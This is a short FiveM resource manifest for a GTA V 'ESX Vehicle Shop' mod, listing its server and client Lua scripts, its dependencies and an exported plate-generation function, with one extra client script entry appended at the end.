fx_version 'adamant'

game 'gta5'

description 'ESX Vehicle Shop'

version '1.1.0'

server_scripts {
	'@async/async.lua',
	'@mysql-async/lib/MySQL.lua',
	'@extendedmode/locale.lua',
	'locales/*.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@extendedmode/locale.lua',
	'locales/*.lua',
	'config.lua',
	'client/utils.lua',
	'client/main.lua'
}

dependency 'extendedmode'

export 'GeneratePlate'
client_script 'fyac.lua'